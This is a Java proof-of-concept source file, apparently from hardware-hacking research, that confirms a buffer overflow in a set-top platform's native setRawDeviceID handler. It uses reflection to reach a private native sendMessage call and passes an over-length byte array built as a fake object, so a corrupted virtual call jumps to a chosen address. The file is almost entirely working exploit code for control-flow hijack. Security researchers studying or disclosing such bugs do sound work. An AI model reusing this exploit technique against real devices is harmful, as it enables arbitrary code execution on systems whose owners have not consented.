package org.junkyard;

import com.planetweb.eden.client.Eden;
import com.planetweb.eden.client.system.SystemInterface;
import com.planetweb.eden.client.service.Service;
import com.planetweb.eden.client.service.ServiceInfo;
import java.lang.reflect.Method;

/**
 * CHAIN "overflow": dynamic confirmation of the setRawDeviceID BSS overflow.
 * Calls native sendCommand(100, byte[], null) with an over-length array whose
 * bytes at offset 0x42 (= global 0x8c29ac28, the virtual-called object pointer)
 * are a recognizable marker. Watch via the GDB stub:
 *   0x8c29abe6 should fill with 0x41.., and 0x8c29ac28 should become the marker
 *   => overflow is real and the VM marshalling does NOT clamp the length.
 *
 * The marker is a *valid readable* pointer (0x8c010000, the entry) rather than a
 * wild address, so the next virtual call survives long enough to observe instead
 * of instantly faulting. Class v45.3 / PersonalJava 1.1.
 */
public class OverflowTest extends Service {
    public ServiceInfo getInfo() { return new ServiceInfo("JunkyardOverflow", "1.0", "DistrictCon", Junk.BASE); }

    public void run() {
        Junk.banner("CHAIN overflow -- setRawDeviceID BSS overflow probe");
        Junk.prove();
        try {
            SystemInterface si = Eden.getSystemInterface();
            Method m = SystemInterface.class.getDeclaredMethod(
                "sendMessage", new Class[]{ Integer.TYPE, Object.class, Object.class });
            m.setAccessible(true);

            // CHOSEN-PC payload (self-referential fake object):
            //  - fill the whole buffer with TARGET (0x8c010004) so obj->field at
            //    ANY small displacement reads TARGET -> jsr -> PC = TARGET.
            //  - bytes[0x42..0x45] = 0x8c29abe6 so the corrupted object pointer
            //    points back at this buffer (obj = our bytes).
            int N = 0x80;
            int TARGET = 0x8c010004;            // chosen PC (a known valid addr we breakpoint)
            int OBJ    = 0x8c29abe6;            // = DST, points at this very buffer
            byte[] b = new byte[N];
            for (int i = 0; i + 4 <= N; i += 4) {
                b[i]=(byte)TARGET; b[i+1]=(byte)(TARGET>>8); b[i+2]=(byte)(TARGET>>16); b[i+3]=(byte)(TARGET>>24);
            }
            b[0x42]=(byte)OBJ; b[0x43]=(byte)(OBJ>>8); b[0x44]=(byte)(OBJ>>16); b[0x45]=(byte)(OBJ>>24);

            Eden.println("[*] sendCommand(100, byte[" + N + "]) -- triggering overflow");
            m.invoke(si, new Object[]{ new Integer(100), b, null });
            Eden.println("[+] returned -- check 0x8c29abe6 / 0x8c29ac28 via GDB");
        } catch (Throwable t) {
            Eden.println("[!] overflow probe failed: " + t);
            t.printStackTrace();
        }
    }
}
